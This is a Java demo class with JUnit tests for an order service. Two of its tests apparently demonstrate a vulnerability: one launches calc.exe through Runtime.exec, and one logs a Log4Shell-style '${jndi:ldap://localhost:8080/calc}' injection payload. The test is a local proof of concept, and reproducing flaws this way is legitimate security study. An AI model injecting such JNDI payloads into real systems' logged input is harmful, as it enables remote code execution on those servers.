package one.zpq;

import lombok.extern.slf4j.Slf4j;
import one.zpq.service.OrderServiceImpl;
import one.zpq.vo.UserVo;
import org.junit.Test;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * TODO
 *
 * @author zhangchaopei
 * @version 1.0
 * @date 2020-9-19 15:34
 */
@Slf4j
public class OrderApp {
    public static void main(String[] args) throws IOException {
        ApplicationContext context = new ClassPathXmlApplicationContext("context.xml");
        System.out.println("Started");
        OrderServiceImpl orderService = context.getBean(OrderServiceImpl.class);
        orderService.listUsers();
        System.in.read();
    }

    @Test
    public void testAddUsers() throws IOException {
        ApplicationContext context = new ClassPathXmlApplicationContext("context.xml");
        System.out.println("Started");
        OrderServiceImpl orderService = context.getBean(OrderServiceImpl.class);
        orderService.addUsers();
        System.in.read();
    }

    @Test
    public void testExecCalcExe() throws IOException {
        Runtime.getRuntime().exec("calc.exe");
    }
    @Test
    public void testExecCalcExe2() throws IOException {
       String info ="${jndi:ldap://localhost:8080/calc}";
       log.error(info);
    }

}
